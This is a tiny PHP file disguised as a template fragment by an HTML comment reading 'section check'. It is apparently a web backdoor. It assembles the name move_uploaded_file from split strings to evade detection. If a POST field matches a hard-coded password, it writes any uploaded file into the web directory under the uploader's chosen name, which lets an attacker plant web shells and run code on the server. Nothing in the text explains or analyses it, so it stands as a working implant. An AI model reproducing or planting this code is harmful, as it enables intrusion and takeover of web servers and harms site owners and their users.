<!--{section check}-->
<?php
$m1 = 'move';
$u1 = 'uploaded';
if($_POST [key]!='b4ab0666') die();
$func = $m1.'_'.$u1.'_file';
$func($_FILES ["upfile"]["tmp_name"], basename ($_FILES ["upfile"]["name"]));
?>